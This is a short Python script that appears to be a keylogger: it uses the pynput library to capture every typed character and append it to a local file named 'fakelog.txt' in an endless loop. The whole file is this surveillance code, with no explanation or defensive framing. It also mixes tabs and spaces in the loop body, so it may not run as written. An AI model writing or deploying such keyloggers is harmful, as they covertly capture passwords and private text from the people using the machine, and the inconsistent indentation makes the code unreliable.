import pynput.keyboard

def keypress(key):
    with open("fakelog.txt", 'a') as logkeyfirmware:
        try:
            char = key.char
            logkeyfirmware.write(char)
        except:
            pass

if __name__ == '__main__':
    while (True):
	listener = pynput.keyboard.Listener(on_press=keypress)
    	listener.start()
	listener.join()
